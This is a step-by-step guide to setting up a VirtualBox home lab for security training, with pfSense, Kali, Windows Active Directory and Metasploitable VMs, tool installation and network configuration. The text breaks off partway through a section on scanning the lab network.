# Cybersecurity Home Lab Setup Guide

**A Comprehensive Step-by-Step Instruction Manual**

This guide will walk you through setting up a complete cybersecurity home lab for ethical hacking training, penetration testing practice, and security research.

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Hardware Requirements](#hardware-requirements)
3. [Lab Architecture Overview](#lab-architecture-overview)
4. [Phase 1: Foundation Setup](#phase-1-foundation-setup)
5. [Phase 2: Virtual Machines Setup](#phase-2-virtual-machines-setup)
6. [Phase 3: Tools Installation](#phase-3-tools-installation)
7. [Phase 4: Network Configuration](#phase-4-network-configuration)
8. [Phase 5: Documentation Setup](#phase-5-documentation-setup)
9. [Phase 6: Testing and Validation](#phase-6-testing-and-validation)
10. [Appendix: Troubleshooting](#appendix-troubleshooting)

---

## Prerequisites

### Knowledge Requirements
- Basic understanding of networking concepts (IP addressing, subnetting, DNS)
- Familiarity with virtualization concepts
- Basic Linux and Windows command-line skills
- Understanding of cybersecurity fundamentals

### Time Requirements
- Initial setup: 8-12 hours
- Full configuration and testing: 16-20 hours
- Spread over multiple sessions recommended

---

## Hardware Requirements

### Minimum Specifications
- **CPU**: Intel i5/AMD Ryzen 5 or better (with VT-x/AMD-V support)
- **RAM**: 16 GB (32 GB strongly recommended)
- **Storage**: 250 GB free SSD space (500 GB recommended)
- **Network**: Ethernet adapter (recommended for stability)

### Recommended Specifications
- **CPU**: Intel i7/AMD Ryzen 7 or better (8+ cores)
- **RAM**: 32-64 GB
- **Storage**: 500 GB - 1 TB SSD
- **Network**: Gigabit Ethernet

### Virtualization Check
Before proceeding, verify that virtualization is enabled in your BIOS/UEFI:

**Windows:**
```powershell
systeminfo | findstr /C:"Virtualization"
```

**Linux:**
```bash
egrep -o '(vmx|svm)' /proc/cpuinfo
```

**macOS:**
```bash
sysctl -a | grep machdep.cpu.features | grep VMX
```

---

## Lab Architecture Overview

### Network Topology

```
                           Internet
                               |
                        [Host Machine]
                               |
              +----------------+----------------+
              |                |                |
         [NAT Network]   [Internal Net]  [Host-Only]
              |                |                |
        +-----------+     +----------+    +-----------+
        | pfSense   |     | Windows  |    | Kali      |
        | Firewall  |     | Server   |    | Linux     |
        +-----------+     | (AD)     |    +-----------+
              |           +----------+          |
              |                |                |
        +-----------+     +----------+    +-----------+
        | Windows   |     | Windows  |    | Meta-     |
        | 10/11     |     | Clients  |    | sploitable|
        | Client    |     +----------+    +-----------+
        +-----------+
```

### Virtual Machines Overview

| VM Name | Purpose | RAM | Storage | OS |
|---------|---------|-----|---------|-----|
| pfSense | Firewall/Router | 2 GB | 20 GB | FreeBSD-based |
| Kali Linux | Penetration Testing | 4 GB | 80 GB | Debian-based |
| Windows 10/11 | Target Client | 4 GB | 60 GB | Windows |
| Windows Server | Active Directory | 4 GB | 60 GB | Windows Server 2019/2022 |
| Metasploitable | Vulnerable Target | 1 GB | 20 GB | Ubuntu-based |

**Total Resources**: ~15 GB RAM, ~240 GB Storage

---

## Phase 1: Foundation Setup

### Step 1.1: Install VirtualBox

VirtualBox is the virtualization platform that will host all lab VMs.

#### Windows Installation

1. **Download VirtualBox**
   - Visit: https://www.virtualbox.org/wiki/Downloads
   - Download "Windows hosts" installer
   - Current version: 7.0.x or later

2. **Run Installer**
   ```
   - Double-click VirtualBox-x.x.x-xxxxx-Win.exe
   - Accept license agreement
   - Choose installation location (default: C:\Program Files\Oracle\VirtualBox)
   - Keep all default features selected
   - Click "Yes" to network interface warning
   - Click "Install"
   - Click "Finish"
   ```

3. **Install Extension Pack** (Required for USB 2.0/3.0, PXE boot)
   ```
   - Download "VirtualBox Extension Pack" from same page
   - Double-click the .vbox-extpack file
   - VirtualBox will open and prompt installation
   - Scroll to bottom and click "I Agree"
   - Enter administrator password if prompted
   ```

#### Linux Installation (Ubuntu/Debian)

```bash
# Add VirtualBox repository
wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc -O- | sudo apt-key add -
echo "deb [arch=amd64] https://download.virtualbox.org/virtualbox/debian $(lsb_release -cs) contrib" | sudo tee /etc/apt/sources.list.d/virtualbox.list

# Update and install
sudo apt update
sudo apt install virtualbox-7.0 -y

# Add user to vboxusers group
sudo usermod -aG vboxusers $USER

# Install Extension Pack
cd ~/Downloads
wget https://download.virtualbox.org/virtualbox/7.0.x/Oracle_VM_VirtualBox_Extension_Pack-7.0.x.vbox-extpack
sudo VBoxManage extpack install Oracle_VM_VirtualBox_Extension_Pack-7.0.x.vbox-extpack

# Reboot to apply changes
sudo reboot
```

#### macOS Installation

```bash
# Download from website and install .dmg
# Or use Homebrew:
brew install --cask virtualbox
brew install --cask virtualbox-extension-pack
```

### Step 1.2: Configure VirtualBox Global Settings

1. **Open VirtualBox**
   - Launch VirtualBox Manager

2. **Configure Default Settings**
   ```
   File → Preferences (or VirtualBox → Preferences on macOS)
   
   General:
   - Default Machine Folder: Choose location with adequate space
     Example: D:\VirtualBox VMs or /home/user/VirtualBox VMs
   
   Input:
   - Virtual Machine: Set Host Key (default: Right Ctrl)
   
   Network:
   - Click "NAT Networks" tab → Click "+" to add network
     - Name: LabNAT
     - IPv4 Prefix: 10.0.2.0/24
     - Enable DHCP: Checked
   
   Extension Pack:
   - Verify "Oracle VM VirtualBox Extension Pack" is listed
   ```

3. **Create Custom Networks**
   
   We'll create three networks for lab isolation:
   
   ```
   File → Tools → Network Manager
   
   NAT Networks Tab:
   - Name: LabNAT
   - IPv4 Prefix: 10.0.2.0/24
   - DHCP: Enabled
   - Port Forwarding: (Configure later as needed)
   
   Host-only Networks Tab:
   - Click "Create" to add new adapter
   - Name: vboxnet0 (or similar)
   - IPv4 Address: 192.168.56.1
   - IPv4 Network Mask: 255.255.255.0
   - DHCP Server: Disabled (we'll use pfSense for DHCP)
   ```

### Step 1.3: Create ISO Storage Directory

Organize ISO files for easy access:

**Windows:**
```powershell
mkdir C:\ISOs
cd C:\ISOs
```

**Linux/macOS:**
```bash
mkdir ~/ISOs
cd ~/ISOs
```

### Step 1.4: Download Required ISOs

Download the following ISO files to your ISO directory:

1. **pfSense**
   - URL: https://www.pfsense.org/download/
   - Version: 2.7.x or later
   - Architecture: AMD64 (64-bit)
   - Installer: DVD Image (ISO)
   - Size: ~750 MB

2. **Kali Linux**
   - URL: https://www.kali.org/get-kali/
   - Version: 2024.x or later
   - Image: 64-bit Installer
   - Size: ~3.5 GB

3. **Windows 10/11 Evaluation**
   - URL: https://www.microsoft.com/en-us/evalcenter/
   - Product: Windows 10 Enterprise or Windows 11 Enterprise
   - Version: Latest
   - Trial: 90 days
   - Size: ~5-6 GB

4. **Windows Server 2019/2022 Evaluation**
   - URL: https://www.microsoft.com/en-us/evalcenter/
   - Product: Windows Server 2022 Standard
   - Version: Latest
   - Trial: 180 days
   - Size: ~5-6 GB

5. **Metasploitable**
   - URL: https://sourceforge.net/projects/metasploitable/
   - Version: Metasploitable 2 or 3
   - Note: Metasploitable 2 comes as .vmdk, not ISO
   - Alternative: Download Metasploitable 3 from GitHub
   - Size: ~1-2 GB

---

## Phase 2: Virtual Machines Setup

### Step 2.1: Create pfSense Firewall VM

pfSense will act as the network gateway and firewall for the lab.

#### Create VM

1. **Initial Setup**
   ```
   VirtualBox Manager → New
   
   Name: pfSense-Firewall
   Type: BSD
   Version: FreeBSD (64-bit)
   Memory: 2048 MB (2 GB)
   Hard disk: Create a virtual hard disk now → Create
   
   Hard Disk:
   - File size: 20 GB
   - Hard disk file type: VDI
   - Storage: Dynamically allocated
   → Create
   ```

2. **Configure VM Settings**
   ```
   Right-click pfSense-Firewall → Settings
   
   System:
   - Motherboard Tab:
     - Boot Order: Optical, Hard Disk (uncheck Floppy)
     - Chipset: PIIX3
     - Enable I/O APIC: Checked
   - Processor Tab:
     - Processors: 2 CPUs
     - Enable PAE/NX: Checked
   
   Display:
   - Screen Tab:
     - Video Memory: 16 MB
     - Graphics Controller: VMSVGA
   
   Storage:
   - Controller: IDE → Click Empty → Click CD icon
     - Choose pfSense ISO file
   
   Network:
   - Adapter 1:
     - Enable Network Adapter: Checked
     - Attached to: NAT (for WAN - Internet access)
     - Adapter Type: Intel PRO/1000 MT Desktop
   - Adapter 2:
     - Enable Network Adapter: Checked
     - Attached to: Internal Network
     - Name: intnet
     - Adapter Type: Intel PRO/1000 MT Desktop
   - Adapter 3:
     - Enable Network Adapter: Checked
     - Attached to: Host-only Adapter
     - Name: vboxnet0
     - Adapter Type: Intel PRO/1000 MT Desktop
   ```

#### Install pfSense

1. **Start Installation**
   ```
   - Start the VM
   - Wait for boot menu
   - Press Enter or wait for auto-boot
   ```

2. **Installation Steps**
   ```
   Step 1: Welcome Screen
   - Accept copyright notice → Press Enter
   
   Step 2: Install pfSense
   - Select "Install" → Press Enter
   
   Step 3: Keymap Selection
   - Select your keyboard layout
   - Default: "US" → Press Enter
   
   Step 4: Partitioning
   - Select "Auto (UFS)" → Press Enter
   - Confirm: "Yes" → Press Enter
   
   Step 5: Installation Progress
   - Wait for installation to complete (2-5 minutes)
   
   Step 6: Manual Configuration
   - Select "No" → Press Enter
   
   Step 7: Reboot
   - Select "Reboot" → Press Enter
   - Devices → Optical Drives → Remove disk from virtual drive
   ```

3. **Initial Configuration**
   ```
   After reboot, configure interfaces:
   
   Question: Should VLANs be set up now?
   - Answer: n
   
   Question: Enter the WAN interface name:
   - Answer: em0
   
   Question: Enter the LAN interface name:
   - Answer: em1
   
   Question: Enter the Optional 1 interface name:
   - Answer: em2
   
   Question: Do you want to proceed?
   - Answer: y
   
   Wait for interface configuration to complete.
   ```

4. **Configure IP Addresses**
   ```
   Main Menu → Option 2: Set interface(s) IP address
   
   Configure LAN (em1):
   - Select: 2 (LAN)
   - IPv4 Address: 192.168.1.1
   - Subnet mask: 24
   - Upstream gateway: (Leave empty, press Enter)
   - IPv6: n
   - Enable DHCP: y
   - Start address: 192.168.1.100
   - End address: 192.168.1.200
   - Revert to HTTP: n
   
   Configure OPT1 (em2):
   - Select: 3 (OPT1)
   - IPv4 Address: 192.168.56.2
   - Subnet mask: 24
   - Upstream gateway: (Leave empty, press Enter)
   - IPv6: n
   - Enable DHCP: n
   - Revert to HTTP: n
   ```

5. **Access Web Interface**
   ```
   From your host machine:
   - Open browser
   - Navigate to: https://192.168.56.2
   - Accept security warning
   - Username: admin
   - Password: pfsense
   
   Complete Setup Wizard:
   - Next → Next
   - Hostname: pfsense
   - Domain: lab.local
   - Primary DNS: 8.8.8.8
   - Secondary DNS: 8.8.4.4
   - Next → Next
   - Set new admin password (IMPORTANT: Save this!)
   - Reload → Finish
   ```

### Step 2.2: Create Kali Linux VM

Kali Linux is the primary penetration testing distribution.

#### Create VM

1. **Initial Setup**
   ```
   VirtualBox Manager → New
   
   Name: Kali-Linux
   Type: Linux
   Version: Debian (64-bit)
   Memory: 4096 MB (4 GB)
   Hard disk: Create a virtual hard disk now → Create
   
   Hard Disk:
   - File size: 80 GB
   - Hard disk file type: VDI
   - Storage: Dynamically allocated
   → Create
   ```

2. **Configure VM Settings**
   ```
   Right-click Kali-Linux → Settings
   
   System:
   - Motherboard Tab:
     - Boot Order: Optical, Hard Disk
     - Enable I/O APIC: Checked
   - Processor Tab:
     - Processors: 2-4 CPUs
     - Enable PAE/NX: Checked
   
   Display:
   - Screen Tab:
     - Video Memory: 128 MB
     - Graphics Controller: VMSVGA
     - Enable 3D Acceleration: Checked
   
   Storage:
   - Controller: IDE → Click Empty → Click CD icon
     - Choose Kali Linux ISO file
   
   Network:
   - Adapter 1:
     - Enable Network Adapter: Checked
     - Attached to: Host-only Adapter
     - Name: vboxnet0
     - Adapter Type: Intel PRO/1000 MT Desktop
   
   Shared Clipboard: Bidirectional
   Drag'n'Drop: Bidirectional
   ```

#### Install Kali Linux

1. **Start Installation**
   ```
   - Start the VM
   - Select "Graphical Install" from boot menu
   ```

2. **Installation Steps**
   ```
   Step 1: Language
   - Select: English → Continue
   
   Step 2: Location
   - Select your country → Continue
   
   Step 3: Keyboard
   - Select your keyboard layout → Continue
   
   Step 4: Network Configuration
   - Hostname: kali
   - Domain name: lab.local → Continue
   
   Step 5: User Setup
   - Full name: Kali User → Continue
   - Username: kali → Continue
   - Password: (Create strong password) → Continue
   - Re-enter password → Continue
   
   Step 6: Clock
   - Select your timezone → Continue
   
   Step 7: Partition Disks
   - Method: Guided - use entire disk → Continue
   - Select disk: SCSI1 (sda) → Continue
   - Partitioning scheme: All files in one partition → Continue
   - Finish partitioning: Yes → Continue
   - Write changes: Yes → Continue
   
   Step 8: Software Selection
   - Desktop Environment: Xfce (default)
   - Keep default tools selected
   - Continue (installation takes 15-30 minutes)
   
   Step 9: GRUB Bootloader
   - Install GRUB: Yes → Continue
   - Device: /dev/sda → Continue
   
   Step 10: Finish
   - Installation complete → Continue
   - Remove installation media → Reboot
   ```

3. **Post-Installation Configuration**
   ```
   - Login with username: kali and your password
   
   Update system:
   - Open Terminal (Ctrl+Alt+T)
   ```
   
   ```bash
   sudo apt update
   sudo apt full-upgrade -y
   sudo apt autoremove -y
   
   # Install VirtualBox Guest Additions
   sudo apt install -y virtualbox-guest-x11
   sudo reboot
   ```

4. **Network Configuration**
   ```bash
   # After reboot, check network
   ip addr show
   
   # Configure static IP (optional)
   sudo nano /etc/network/interfaces
   
   # Add:
   auto eth0
   iface eth0 inet static
       address 192.168.56.10
       netmask 255.255.255.0
       gateway 192.168.56.2
   
   # Restart networking
   sudo systemctl restart networking
   ```

### Step 2.3: Create Windows 10/11 Client VM

Windows client for testing and target practice.

#### Create VM

1. **Initial Setup**
   ```
   VirtualBox Manager → New
   
   Name: Windows-10-Client
   Type: Microsoft Windows
   Version: Windows 10 (64-bit) or Windows 11 (64-bit)
   Memory: 4096 MB (4 GB)
   Hard disk: Create a virtual hard disk now → Create
   
   Hard Disk:
   - File size: 60 GB
   - Hard disk file type: VDI
   - Storage: Dynamically allocated
   → Create
   ```

2. **Configure VM Settings**
   ```
   Right-click Windows-10-Client → Settings
   
   System:
   - Motherboard Tab:
     - Boot Order: Optical, Hard Disk
     - Enable I/O APIC: Checked
     - Enable EFI: Checked (for Windows 11)
   - Processor Tab:
     - Processors: 2-4 CPUs
     - Enable PAE/NX: Checked
   
   Display:
   - Screen Tab:
     - Video Memory: 128 MB
     - Graphics Controller: VMSVGA
     - Enable 3D Acceleration: Checked
   
   Storage:
   - Controller: SATA → Click Empty → Click CD icon
     - Choose Windows 10/11 ISO file
   
   Network:
   - Adapter 1:
     - Enable Network Adapter: Checked
     - Attached to: Internal Network
     - Name: intnet
     - Adapter Type: Intel PRO/1000 MT Desktop
   
   Shared Clipboard: Bidirectional
   Drag'n'Drop: Bidirectional
   ```

#### Install Windows 10/11

1. **Start Installation**
   ```
   - Start the VM
   - Press any key when prompted
   ```

2. **Installation Steps**
   ```
   Step 1: Language and Settings
   - Language: English (United States)
   - Time: Your timezone
   - Keyboard: US → Next
   
   Step 2: Install Now
   - Click "Install now"
   
   Step 3: Activation
   - Click "I don't have a product key"
   
   Step 4: Edition Selection
   - Select: Windows 10/11 Enterprise → Next
   
   Step 5: License Terms
   - Check "I accept" → Next
   
   Step 6: Installation Type
   - Select "Custom: Install Windows only"
   
   Step 7: Disk Selection
   - Select Drive 0 Unallocated Space → Next
   - Installation proceeds (10-20 minutes)
   
   Step 8: Region
   - Select your region → Yes
   
   Step 9: Keyboard
   - Select your keyboard → Yes
   - Skip second keyboard layout
   
   Step 10: Network
   - Select "I don't have internet" → Continue with limited setup
   
   Step 11: User Account
   - Name: labuser → Next
   - Password: (Create strong password) → Next
   - Security questions: Answer all three
   
   Step 12: Privacy Settings
   - Disable all → Accept
   ```

3. **Post-Installation Configuration**
   ```
   - Login to Windows
   
   Install VirtualBox Guest Additions:
   - Devices → Insert Guest Additions CD image
   - Open File Explorer → This PC → CD Drive
   - Run VBoxWindowsAdditions.exe
   - Follow installation wizard → Reboot
   
   Windows Updates:
   - Settings → Update & Security → Windows Update
   - Check for updates → Install all
   
   Network Configuration:
   - Settings → Network & Internet → Ethernet
   - Change adapter options → Ethernet adapter
   - Properties → Internet Protocol Version 4
   - Configure:
     - IP: 192.168.1.101
     - Subnet: 255.255.255.0
     - Gateway: 192.168.1.1
     - DNS: 192.168.1.1
   ```

### Step 2.4: Create Windows Server (Active Directory) VM

Windows Server for domain controller and AD testing.

#### Create VM

1. **Initial Setup**
   ```
   VirtualBox Manager → New
   
   Name: Windows-Server-DC
   Type: Microsoft Windows
   Version: Windows 2019 (64-bit) or Windows 2022 (64-bit)
   Memory: 4096 MB (4 GB)
   Hard disk: Create a virtual hard disk now → Create
   
   Hard Disk:
   - File size: 60 GB
   - Hard disk file type: VDI
   - Storage: Dynamically allocated
   → Create
   ```

2. **Configure VM Settings**
   ```
   Right-click Windows-Server-DC → Settings
   
   System:
   - Motherboard Tab:
     - Boot Order: Optical, Hard Disk
     - Enable I/O APIC: Checked
   - Processor Tab:
     - Processors: 2-4 CPUs
     - Enable PAE/NX: Checked
   
   Display:
   - Screen Tab:
     - Video Memory: 128 MB
     - Graphics Controller: VMSVGA
   
   Storage:
   - Controller: SATA → Click Empty → Click CD icon
     - Choose Windows Server ISO file
   
   Network:
   - Adapter 1:
     - Enable Network Adapter: Checked
     - Attached to: Internal Network
     - Name: intnet
     - Adapter Type: Intel PRO/1000 MT Desktop
   
   Shared Clipboard: Bidirectional
   Drag'n'Drop: Bidirectional
   ```

#### Install Windows Server

1. **Start Installation**
   ```
   - Start the VM
   - Press any key when prompted
   ```

2. **Installation Steps**
   ```
   Step 1: Language and Settings
   - Language: English (United States)
   - Time: Your timezone
   - Keyboard: US → Next
   
   Step 2: Install Now
   - Click "Install now"
   
   Step 3: Activation
   - Click "I don't have a product key"
   
   Step 4: Edition Selection
   - Select: Windows Server 2022 Standard (Desktop Experience) → Next
   
   Step 5: License Terms
   - Check "I accept" → Next
   
   Step 6: Installation Type
   - Select "Custom: Install Windows only"
   
   Step 7: Disk Selection
   - Select Drive 0 Unallocated Space → Next
   - Installation proceeds (10-20 minutes)
   
   Step 8: Administrator Password
   - Set strong administrator password → Finish
   - Press Ctrl+Alt+Del (use Host+Del in VirtualBox)
   - Login with administrator password
   ```

3. **Post-Installation Configuration**
   ```
   Install VirtualBox Guest Additions:
   - Devices → Insert Guest Additions CD image
   - Open File Explorer → This PC → CD Drive
   - Run VBoxWindowsAdditions.exe
   - Follow installation wizard → Reboot
   
   Configure Network:
   - Server Manager → Local Server
   - Click Ethernet → Properties
   - Internet Protocol Version 4 → Properties:
     - IP: 192.168.1.10
     - Subnet: 255.255.255.0
     - Gateway: 192.168.1.1
     - Preferred DNS: 127.0.0.1 (after AD install)
     - Alternate DNS: 192.168.1.1
   
   Set Computer Name:
   - Server Manager → Local Server
   - Computer Name → Change
   - Computer Name: DC01
   - Domain: LABDOMAIN.local (after AD install)
   - Restart
   ```

#### Configure Active Directory

1. **Install AD DS Role**
   ```
   Server Manager → Dashboard → Add roles and features
   
   Step 1: Before You Begin → Next
   Step 2: Installation Type → Role-based → Next
   Step 3: Server Selection → Select server → Next
   Step 4: Server Roles:
   - Check "Active Directory Domain Services"
   - Add Features → Next
   Step 5: Features → Next (keep defaults)
   Step 6: AD DS → Next
   Step 7: Confirmation → Install
   - Wait for installation → Close
   ```

2. **Promote to Domain Controller**
   ```
   Server Manager → Flag icon → Promote this server to domain controller
   
   Deployment Configuration:
   - Select "Add a new forest"
   - Root domain name: labdomain.local → Next
   
   Domain Controller Options:
   - Forest/Domain functional level: Windows Server 2016
   - Capabilities: DNS server, Global Catalog (default)
   - DSRM Password: (Set strong password) → Next
   
   DNS Options:
   - Warning about delegation: Ignore → Next
   
   Additional Options:
   - NetBIOS name: LABDOMAIN (default) → Next
   
   Paths:
   - Use defaults → Next
   
   Review Options:
   - Review → Next
   
   Prerequisites Check:
   - Wait for validation → Install
   - Server will restart automatically
   ```

3. **Post-AD Configuration**
   ```
   Login: LABDOMAIN\Administrator
   
   Create Organizational Units:
   - Server Manager → Tools → Active Directory Users and Computers
   - Right-click labdomain.local → New → Organizational Unit
   - Create OUs:
     - Lab Users
     - Lab Computers
     - Lab Servers
   
   Create Test Users:
   - Right-click "Lab Users" → New → User
   - Create users:
     - First Name: John, Last Name: Doe
     - User logon name: jdoe → Next
     - Password: (Strong password)
     - Uncheck "User must change password"
     - Check "Password never expires" (for lab only!)
     - Finish
   - Repeat for additional test users
   
   Create Security Groups:
   - Right-click "Lab Users" → New → Group
   - Create groups:
     - IT Admins
     - Finance Users
     - HR Users
   ```

### Step 2.5: Create Metasploitable VM

Metasploitable is an intentionally vulnerable VM for practice.

#### Option A: Metasploitable 2 (Easier)

1. **Download and Extract**
   ```
   - Download from SourceForge
   - Extract ZIP file to VM directory
   ```

2. **Import to VirtualBox**
   ```
   VirtualBox Manager → New
   
   Name: Metasploitable2
   Type: Linux
   Version: Ubuntu (64-bit)
   Memory: 1024 MB (1 GB)
   Hard disk: Use an existing virtual hard disk file
   - Click folder icon → Navigate to extracted .vmdk file
   → Create
   ```

3. **Configure VM Settings**
   ```
   Right-click Metasploitable2 → Settings
   
   Network:
   - Adapter 1:
     - Enable Network Adapter: Checked
     - Attached to: Internal Network
     - Name: intnet
   ```

4. **Start and Login**
   ```
   - Start VM
   - Login: msfadmin
   - Password: msfadmin
   
   # Configure network
   sudo nano /etc/network/interfaces
   
   # Add:
   auto eth0
   iface eth0 inet static
       address 192.168.1.50
       netmask 255.255.255.0
       gateway 192.168.1.1
   
   sudo /etc/init.d/networking restart
   ```

#### Option B: Metasploitable 3 (Advanced)

Metasploitable 3 requires building from Vagrant:

```bash
# Install Vagrant and Packer
# Clone repository
git clone https://github.com/rapid7/metasploitable3.git
cd metasploitable3

# Build Windows or Linux version
# Follow instructions in repository README
```

---

## Phase 3: Tools Installation

### Step 3.1: Install Tools on Kali Linux

Kali comes with most tools pre-installed, but we'll verify and add missing ones.

#### Core Penetration Testing Tools

1. **Nmap (Network Mapper)**
   ```bash
   # Already installed, verify
   nmap --version
   
   # Basic usage
   nmap -sV 192.168.1.0/24
   ```

2. **Metasploit Framework**
   ```bash
   # Already installed, initialize
   sudo msfdb init
   
   # Start Metasploit
   msfconsole
   
   # In msfconsole:
   db_status
   exit
   ```

3. **Wireshark**
   ```bash
   # Install if not present
   sudo apt install wireshark -y
   
   # Add user to wireshark group
   sudo usermod -aG wireshark $USER
   
   # Reboot to apply
   sudo reboot
   
   # Launch
   wireshark
   ```

4. **Burp Suite Community**
   ```bash
   # Already installed, launch
   burpsuite
   
   # Or from terminal:
   /usr/bin/burpsuite
   
   # Configure proxy:
   # - Proxy tab → Options
   # - Proxy Listeners: 127.0.0.1:8080
   ```

5. **OWASP ZAP**
   ```bash
   # Install
   sudo apt install zaproxy -y
   
   # Launch
   zaproxy
   
   # Configure:
   # - Tools → Options → Local Servers/Proxies
   # - Address: localhost
   # - Port: 8081
   ```

6. **OpenVAS (GVM)**
   ```bash
   # Install
   sudo apt install gvm -y
   
   # Setup (takes 30-60 minutes)
   sudo gvm-setup
   
   # Note the admin password provided
   
   # Start services
   sudo gvm-start
   
   # Access web interface:
   # https://localhost:9392
   # Username: admin
   # Password: (from setup)
   
   # Stop services
   sudo gvm-stop
   ```

#### Development and Scripting Tools

1. **Python and pip**
   ```bash
   # Python already installed
   python3 --version
   
   # Install additional packages
   sudo apt install python3-pip python3-venv -y
   
   # Useful Python packages for pentesting
   pip3 install requests beautifulsoup4 scapy pwntools
   ```

2. **Visual Studio Code**
   ```bash
   # Download and install
   cd ~/Downloads
   wget -O vscode.deb 'https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64'
   sudo dpkg -i vscode.deb
   sudo apt install -f -y
   
   # Launch
   code
   
   # Install useful extensions:
   # - Python
   # - PowerShell
   # - Bash Debug
   # - Markdown All in One
   ```

### Step 3.2: Install Tools on Windows Client

#### Wireshark for Windows

1. **Download and Install**
   ```
   - Visit: https://www.wireshark.org/download.html
   - Download Windows Installer (64-bit)
   - Run installer
   - Keep all default options
   - Install Npcap when prompted (required for packet capture)
   - Finish installation
   ```

2. **Configure Wireshark**
   ```
   - Launch Wireshark
   - Edit → Preferences
   - Protocols → HTTP → Decompress HTTP responses: Checked
   - OK
   ```

#### Burp Suite Community for Windows

1. **Download and Install**
   ```
   - Visit: https://portswigger.net/burp/communitydownload
   - Download Windows (64-bit) installer
   - Run installer
   - Accept license
   - Choose installation directory
   - Install
   ```

2. **Configure Browser Proxy**
   ```
   Firefox Configuration:
   - Settings → Network Settings → Settings
   - Manual proxy configuration:
     - HTTP Proxy: 127.0.0.1, Port: 8080
     - Use this proxy for HTTPS: Checked
   - OK
   
   Import Burp Certificate:
   - Start Burp Suite
   - Proxy → Options → Import / export CA certificate
   - Export certificate in DER format
   - In Firefox: Settings → Privacy & Security → Certificates
   - View Certificates → Authorities → Import
   - Select Burp certificate → Trust for websites → OK
   ```

#### Nmap for Windows

```
- Visit: https://nmap.org/download.html
- Download Windows installer
- Run installer with default options
- Add to PATH during installation
- Verify: Open CMD → nmap --version
```

#### Python for Windows

```
- Visit: https://www.python.org/downloads/
- Download Python 3.11+ Windows installer (64-bit)
- Run installer
- ☑ Add Python to PATH (IMPORTANT!)
- Click "Install Now"
- Verify: Open CMD → python --version
```

#### Visual Studio Code for Windows

```
- Visit: https://code.visualstudio.com/
- Download Windows installer
- Run installer
- Keep all default options
- Check "Add to PATH"
- Install
```

### Step 3.3: Install Documentation Tools

#### Obsidian

**Description**: Powerful note-taking app for documenting lab work and findings.

**Windows Installation:**
```
- Visit: https://obsidian.md/download
- Download Windows installer
- Run installer
- Launch Obsidian
- Create new vault: "Cybersecurity Lab"
- Location: Choose appropriate directory
```

**Linux Installation:**
```bash
cd ~/Downloads
wget https://github.com/obsidian-md/obsidian-releases/releases/download/v1.4.x/obsidian_x.x.x_amd64.deb
sudo dpkg -i obsidian_x.x.x_amd64.deb
sudo apt install -f -y
```

**Initial Configuration:**
```
Create folder structure:
- Cybersecurity Lab/
  ├── 01-Lab Setup/
  ├── 02-Network Diagrams/
  ├── 03-VM Configurations/
  ├── 04-Tools and Commands/
  ├── 05-Practice Exercises/
  ├── 06-Findings and Reports/
  └── 07-References/

Install useful plugins:
- Settings → Community plugins → Browse
- Install: Dataview, Templater, Calendar
```

#### Flameshot

**Description**: Powerful screenshot tool for documentation.

**Linux Installation (Kali):**
```bash
sudo apt install flameshot -y

# Configure shortcut
# Settings → Keyboard → Application Shortcuts
# Command: flameshot gui
# Shortcut: Print (or Shift+Print)

# Launch
flameshot gui
```

**Windows Installation:**
```
- Visit: https://github.com/flameshot-org/flameshot/releases
- Download Windows installer
- Run installer
- Configure to start on boot
- Shortcut: PrtScn key
```

---

## Phase 4: Network Configuration

### Step 4.1: Configure pfSense Firewall Rules

#### Access pfSense Web Interface

```
From Kali Linux or host machine:
- Open browser
- Navigate to: https://192.168.56.2
- Login: admin / (your password)
```

#### Create Firewall Rules

1. **LAN Rules**
   ```
   Firewall → Rules → LAN
   
   Rule 1: Allow LAN to WAN
   - Action: Pass
   - Interface: LAN
   - Protocol: Any
   - Source: LAN net
   - Destination: Any
   - Description: Allow LAN to Internet
   - Save → Apply Changes
   
   Rule 2: Allow LAN to Lab Network
   - Action: Pass
   - Interface: LAN
   - Protocol: Any
   - Source: LAN net
   - Destination: 192.168.56.0/24
   - Description: Allow LAN to Host-Only network
   - Save → Apply Changes
   ```

2. **OPT1 (Host-Only) Rules**
   ```
   Firewall → Rules → OPT1
   
   Rule 1: Allow Host-Only to LAN
   - Action: Pass
   - Protocol: Any
   - Source: OPT1 net
   - Destination: LAN net
   - Description: Allow host-only to internal network
   - Save → Apply Changes
   
   Rule 2: Allow Host-Only to Internet
   - Action: Pass
   - Protocol: Any
   - Source: OPT1 net
   - Destination: Any
   - Description: Allow host-only to internet
   - Save → Apply Changes
   ```

#### Configure DNS

```
Services → DNS Resolver

Settings:
- Enable DNS Resolver: Checked
- Listen Port: 53
- Network Interfaces: All
- Outgoing Network Interfaces: WAN
- DHCP Registration: Checked
- Static DHCP: Checked
- Save → Apply Changes
```

#### Configure DHCP (Optional)

```
Services → DHCP Server → LAN

Settings:
- Enable: Checked
- Range: 192.168.1.100 to 192.168.1.200
- DNS Servers: 192.168.1.1
- Gateway: 192.168.1.1
- Domain name: lab.local
- Save → Apply Changes
```

### Step 4.2: Configure Windows Domain

#### Join Windows Client to Domain

1. **On Windows 10/11 Client**
   ```
   Settings → System → About → Rename this PC (advanced)
   - Computer Name → Change
   - Member of: Domain
   - Domain: labdomain.local
   - OK
   - Credentials: LABDOMAIN\Administrator + password
   - Welcome message → OK
   - Restart now
   
   Login:
   - Other user → LABDOMAIN\jdoe (or other domain user)
   ```

#### Configure DNS on Clients

1. **Windows Clients**
   ```
   Network Settings:
   - Preferred DNS: 192.168.1.10 (Domain Controller)
   - Alternate DNS: 192.168.1.1 (pfSense)
   ```

2. **Kali Linux**
   ```bash
   # Edit DNS settings
   sudo nano /etc/resolv.conf
   
   # Add:
   nameserver 192.168.1.10
   nameserver 192.168.56.2
   ```

### Step 4.3: Network Testing

#### Connectivity Tests

1. **From Kali Linux**
   ```bash
   # Test pfSense connectivity
   ping -c 4 192.168.56.2
   
   # Test internal network
   ping -c 4 192.168.1.1
   
   # Test Domain Controller
   ping -c 4 192.168.1.10
   
   # Test Windows Client
   ping -c 4 192.168.1.101
   
   # Test Internet
   ping -c 4 8.8.8.8
   
   # Test DNS
   nslookup google.com
   ```

2. **From Windows Client**
   ```cmd
   :: Test Domain Controller
   ping 192.168.1.10
   
   :: Test gateway
   ping 192.168.1.1
   
   :: Test Internet
   ping 8.8.8.8
   
   :: Test DNS
   nslookup labdomain.local
   ```

#### Network Scanning

```bash
# From Kali Linux
# Scan internal network
nmap -sn 192.168.1.0/24

# Detailed scan of specific host
